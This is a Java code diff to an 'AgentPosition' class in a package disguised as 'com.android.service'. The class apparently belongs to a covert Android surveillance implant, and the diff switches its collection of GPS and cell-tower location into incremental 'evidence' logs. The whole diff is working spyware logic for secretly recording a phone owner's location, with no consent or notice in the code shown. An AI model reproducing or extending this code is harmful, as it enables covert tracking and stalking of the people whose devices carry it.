@@ -29,12 +29,13 @@ import com.android.service.auto.Cfg;
 import com.android.service.conf.Configuration;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceType;
+import com.android.service.interfaces.IncrementalLog;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 
-public class AgentPosition extends AgentBase implements LocationListener {
+public class AgentPosition extends AgentBase implements IncrementalLog,LocationListener {
 	private static final String TAG = "AgentPosition";
 	private static final int TYPE_GPS = 1;
 	private static final int TYPE_CELL = 2;
@@ -55,12 +56,43 @@ public class AgentPosition extends AgentBase implements LocationListener {
 
 	int period;
 
+	LogR logIncrGPS, logIncrCell;
+	
+
 	@Override
 	public void begin() {
+
+		if (gpsEnabled) {
+			logIncrGPS = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GPS));
+		}
+
+		if (cellEnabled) {
+			logIncrCell=factoryCellLog();
+		}
 
 		locator = new GPSLocatorPeriod(this, period);
 		locator.start();
 
+	}
+
+	private LogR factoryCellLog() {
+		LogR logCell=null;
+		final CellInfo info = Device.getCellInfo();
+		if (!info.valid) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + "invalid cell info");
+			}
+			return null;
+		}
+
+		if (info.gsm) {
+			logCell = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GSM));
+		} else if (info.cdma) {
+			logCell = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_CDMA));
+
+		}
+		
+		return logCell;
 	}
 
 	@Override
@@ -74,6 +106,13 @@ public class AgentPosition extends AgentBase implements LocationListener {
 			}
 		}
 		locator = null;
+
+		if (logIncrCell != null) {
+			logIncrCell.close();
+		}
+		if (logIncrGPS != null) {
+			logIncrGPS.close();
+		}
 	}
 
 	@Override
@@ -214,14 +253,16 @@ public class AgentPosition extends AgentBase implements LocationListener {
 			return;
 		}
 
+		byte[] payload = null;
 		if (info.gsm) {
-			final byte[] payload = getCellPayload(info, LOG_TYPE_GSM);
-			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GSM), payload);
+			payload = getCellPayload(info, LOG_TYPE_GSM);
+			logIncrCell.write(payload);
+
+		} else if (info.cdma) {
+			payload = getCellPayload(info, LOG_TYPE_CDMA);
+			logIncrCell.write(payload);
 		}
-		if (info.cdma) {
-			final byte[] payload = getCellPayload(info, LOG_TYPE_CDMA);
-			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_CDMA), payload);
-		}
+
 	}
 
 	private void locationGPS() {
@@ -256,7 +297,10 @@ public class AgentPosition extends AgentBase implements LocationListener {
 			lastLocation = null;
 		}
 
-		new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GPS), payload);
+		// new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
+		// getAdditionalData(0, LOG_TYPE_GPS), payload);
+
+		logIncrGPS.write(payload);
 
 		/*
 		 * Evidence logGPS = new Evidence(EvidenceType.LOCATION_NEW);
@@ -545,6 +589,20 @@ public class AgentPosition extends AgentBase implements LocationListener {
 
 		return messageEvidence(gpsPosition, LOG_TYPE_GPS);
 
+	}
+
+	public void resetLog() {
+		if (logIncrCell != null && logIncrCell.hasData()) {
+			logIncrCell.close();
+			logIncrCell = logIncrCell=factoryCellLog();
+		}
+
+		if (logIncrGPS != null && logIncrGPS.hasData()) {
+			logIncrGPS.close();
+			if (gpsEnabled) {
+				logIncrGPS = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GPS));
+			}
+		}
 	}
 
 }
